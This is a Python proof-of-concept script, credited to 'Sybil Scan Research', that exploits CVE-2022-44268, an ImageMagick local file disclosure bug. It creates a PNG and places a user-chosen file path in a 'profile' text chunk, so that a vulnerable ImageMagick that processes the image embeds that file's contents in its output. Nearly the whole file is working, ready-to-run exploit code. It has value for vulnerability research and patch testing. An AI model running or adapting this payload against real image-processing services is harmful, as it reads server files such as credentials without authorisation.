import png
import argparse
import os
import time
from PIL import Image, PngImagePlugin


#              ,----------------,              ,---------,
#         ,-----------------------,          ,"        ,"|
#       ,"                      ,"|        ,"        ,"  |
#      +-----------------------+  |      ,"        ,"    |
#      |  .-----------------.  |  |     +---------+      |
#      |  |                 |  |  |     | -==----'|      |
#      |  |  Sybil Scan!    |  |  |     |         |      |
#      |  |                 |  |  |/----|`---=    |      |
#      |  |  C:\>_          |  |  |   ,/|==== ooo |      ;
#      |  |                 |  |  |  // |(((( [33]|    ,"
#      |  `-----------------'  |," .;'| |((((     |  ,"
#      +-----------------------+  ;;  | |         |,"    
#         /_)______________(_/  //'   | +---------+
#    ___________________________/___  `,
#   /  oooooooooooooooo  .o.  oooo /,   \,"-----------
#  / ==ooooooooooooooo==.o.  ooo= //   ,`\--{)B     ,"
# /_==__==========__==_ooo__ooo=_/'   /___________,"
# `-----------------------------'






def main():
    print("\n   [\u001b[32;1m>\u001b[0m] ImageMagick LFI PoC - by Sybil Scan Research <research@sybilscan.com>")
    parser = argparse.ArgumentParser(description='imagemagick-LFI : PoC for CVE-2022-44268')
    parser.add_argument('-f','--lfile' , help = 'Local file to read' , required=True)
    parser.add_argument('-o', '--output', help = 'Output png file', required=True)
    args = parser.parse_args()
    time.sleep(0.2)
    print("   [\u001b[32;1m>\u001b[0m] Generating Blank PNG")
    width = 255
    height = 255
    img = []
    for y in range(height):
        row = ()
        for x in range(width):
            row = row + (x, max(0, 255 - x - y), y)
        img.append(row)
    with open('gradient.png', 'wb') as f:
        w = png.Writer(width, height, greyscale=False)
        w.write(f, img)
    time.sleep(0.2)
    print("   [\u001b[32;1m>\u001b[0m] Blank PNG generated")
    time.sleep(0.2)
    print(f"   [\u001b[32;1m>\u001b[0m] Placing Payload to read {args.lfile}")
    info = PngImagePlugin.PngInfo()
    info.add_text("profile", args.lfile)
    im = Image.open("gradient.png")
    im.save(args.output, "PNG", pnginfo=info)
    time.sleep(0.2)
    print(f"   [\u001b[32;1m>\u001b[0m] PoC PNG generated > {args.output}")

    
    gradient_file = "gradient.png"
    if os.path.isfile(gradient_file):
        os.remove(gradient_file)
    else:
        pass



if __name__ == '__main__':
    main()